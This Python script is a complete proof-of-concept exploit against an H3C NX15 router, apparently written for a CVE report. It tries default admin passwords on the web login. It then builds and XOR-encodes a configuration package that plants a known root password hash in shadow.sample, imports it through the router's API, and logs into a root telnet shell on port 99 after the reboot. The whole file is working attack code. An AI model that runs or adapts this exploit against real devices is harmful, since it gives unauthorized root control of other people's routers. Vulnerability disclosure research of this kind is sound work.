#!/usr/bin/env python3
import crypt
import hashlib
import requests
import socket
import tarfile
import time
from pathlib import Path
import shutil

BASE = 'http://192.168.8.1'
HOST = '192.168.8.1'
WORK = Path('/home/coconut/router_digout/POC/h3c/NX15R016/runtime_shadow_sample_poc')
CFG_BASE = Path('/home/coconut/router_digout/cve_report/middle_file/h3c/NX15R016/r017_inner_cfg/mnt')

IAC=255; DONT=254; DO=253; WONT=252; WILL=251


def wait_port(port, timeout=180):
    end = time.time() + timeout
    while time.time() < end:
        s = socket.socket() 
        s.settimeout(2)
        try:
            s.connect((HOST, port))
            s.close()
            return True
        except Exception:
            time.sleep(3)
        finally:
            try: s.close()
            except: pass
    return False


def login_web(passwords=('admin123','Abc12345')):
    for pwd in passwords:
        try:
            # r is the response of login API, if the password is correct, it will return a JSON with code 0 and a session token in data.session
            r = requests.post(BASE + '/api/login/auth', json={'username':'admin','password':pwd}, timeout=8) 
            j = r.json()
            if j.get('code') == 0:
                return pwd, j['data']['session']
        except Exception:
            pass
    raise RuntimeError('no valid web password')


def build_shadow_sample_pkg():
    if WORK.exists():
        shutil.rmtree(WORK)
    WORK.mkdir(parents=True)
    shutil.copytree(CFG_BASE, WORK / 'mnt')
    etcdir = WORK / 'etc'
    etcdir.mkdir()
    root_hash = crypt.crypt('admin123', '$1$KEKJV2R0$')  # the salt is 'KEKJV2R0', which is the same as the one in the original shadow.sample, to ensure the hash format is correct
    (etcdir / 'shadow.sample').write_text(
        f"root:{root_hash}:14587:0:99999:7:::\n"
        "nobody:*:14495:0:99999:7:::\n"
    )
    inner = WORK / 'NX15.tar.gz'
    with tarfile.open(inner, 'w:gz') as tf:
        tf.add(WORK / 'mnt', arcname='mnt')     # arcname is the path inside the tar.gz, it should be 'mnt' to match the expected structure
        tf.add(etcdir / 'shadow.sample', arcname='etc/shadow.sample')
    md5_inner = hashlib.md5(inner.read_bytes()).hexdigest()
    info = WORK / 'NX15.info'
    info.write_text('NX15V100R017\n' + md5_inner + '\n')
    outer = WORK / 'NX15_org.cfg'
    with tarfile.open(outer, 'w:gz') as tf:
        tf.add(info, arcname='NX15.info')
        tf.add(inner, arcname='NX15.tar.gz')
    enc = WORK / 'NX15.cfg'
    enc.write_bytes(bytes(b ^ 0x55 for b in outer.read_bytes()))            # file encrption
    return enc


def upload_and_import(session, pkg):
    headers_bin = {'AUTHENTICATION': session, 'Content-Type': 'application/octet-stream'}
    headers_json = {'AUTHENTICATION': session}
    md5 = hashlib.md5(pkg.read_bytes()).hexdigest()
    size = pkg.stat().st_size           # get evil package's md5 and size for the upload API parameters
    up_url = f"{BASE}/api/upload?type=cfg&chkSum={md5}&fileSize={size}&fileName=NX15.cfg"
    r = requests.post(up_url, data=pkg.read_bytes(), headers=headers_bin, timeout=30)
    print('[+] upload:', r.text)
    try:
        r = requests.post(
            BASE + '/api/esps',
            json=[{'id':1,'object':'esps.system','method':'importprofile','param':{'chkSum':md5,'path':'/tmp/NX15.cfg'}}],
            headers=headers_json,
            timeout=15,
        )
        print('[+] import:', r.text)
    except Exception as e:
        print('[+] import disconnect (expected reboot):', e)


def get_clean(sock):
    data = sock.recv(4096)
    i = 0
    clean = b''
    while i < len(data):
        if data[i] == IAC and i + 2 < len(data):
            cmd, opt = data[i+1], data[i+2]
            if cmd == DO:               # router is asking us to enable an option, we reply with WONT to refuse, to avoid telnet negotiation issues
                sock.sendall(bytes([IAC, WONT, opt]))
            elif cmd == WILL:           # router is saying it will enable an option, we reply with DONT to refuse, to avoid telnet negotiation issues
                sock.sendall(bytes([IAC, DONT, opt]))
            i += 3
        else:
            clean += bytes([data[i]])
            i += 1
    return clean.decode('latin1', 'ignore')


def telnet_root_shell():
    s = socket.socket(); s.settimeout(3); s.connect((HOST, 99))
    transcript = ''
    stage = 0
    start = time.time()
    while time.time() - start < 20:
        try:
            transcript += get_clean(s)
        except socket.timeout:
            pass
        low = transcript.lower()
        if stage == 0 and 'login:' in low:
            s.sendall(b'H3C\r\n')
            stage = 1; transcript = ''; continue
        if stage == 1 and 'password:' in low:
            s.sendall(b'admin123\r\n')
            stage = 2; transcript = ''; continue
        if stage == 2 and 'nx15 login:' in low:
            s.sendall(b'root\r\n')
            stage = 3; transcript = ''; continue
        if stage == 3 and 'password:' in low:
            s.sendall(b'admin123\r\n')
            stage = 4; transcript = ''; continue
        if stage == 4 and ('root@nx15:' in low or '# ' in low or '$ ' in low):
            s.sendall(b'id\n')
            time.sleep(0.5)
            try:
                print(get_clean(s))
            except Exception:
                pass
            return s
    raise RuntimeError('shell not reached')


def main():
    print('[*] waiting web...')
    if not wait_port(80, 180):
        raise SystemExit('web not reachable')
    pwd, session = login_web()
    print('[+] web password:', pwd)
    pkg = build_shadow_sample_pkg()
    print('[+] built package:', pkg)
    upload_and_import(session, pkg)
    print('[*] waiting telnet 99 after reboot...')
    if not wait_port(99, 180):
        raise SystemExit('telnet 99 not reachable')
    sock = telnet_root_shell()
    print('[+] root shell acquired on telnet 99')
    try:
        sock.sendall(b'cat /etc/banner\n')
        time.sleep(0.5)
        print(get_clean(sock))
    except Exception:
        pass
    sock.close()


if __name__ == '__main__':
    main()
